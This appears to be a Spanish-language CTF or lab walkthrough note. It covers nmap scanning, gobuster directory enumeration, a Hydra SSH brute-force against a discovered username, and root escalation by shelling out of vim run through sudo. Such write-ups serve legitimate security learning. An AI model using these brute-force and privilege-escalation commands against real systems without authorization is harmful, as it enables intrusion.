1. Realizamos un [[00. Apuntes/01. Herramientas/NMAP|NMAP]] hacia la IP objetivo:
`nmap -p- -sS -sCV --min-rate 5000 -n -vvv -Pn "IP" -oN "NombreFichero"`

2.  Observamos abiertos los puertos 22 (SSH) y 80 (HTTP), buscamos directorios en la web almacenada [[00. Apuntes/01. Herramientas/GOBUSTER|GOBUSTER]]:
   `$ gobuster dir -u <url> -w <wordlist> -x <extensiones>`

3.  Nos muestra una página llamada `secreto.php` con el nombre de usuario `Mario`:
4.  Conociendo el nombre de un usuario atacaremos por fuerza bruta ([[HYDRA]]) al puerto 22 (SSH):
`hydra -l <usuario> -P <PasswordList> ssh://<IP>`

![[Pasted image 20241117174102.png]]

5. Nos conectamos por SSH con el nombre de usuario y passwd obtenidos:
6. Usamos `sudo -l` parta ver que comandos se pueden ejecutar como root:
![[Pasted image 20241117174250.png]]

7.  Escalada de privilegios:
	- Abrimos vim como root  `sudo -u root /usr/bin/vim`
	- `shift + !`
	- `! bin/bash`
	- Se nos abrirá una bash como root buscamos la escalada de privilegios a través de [[GTFOBINS]]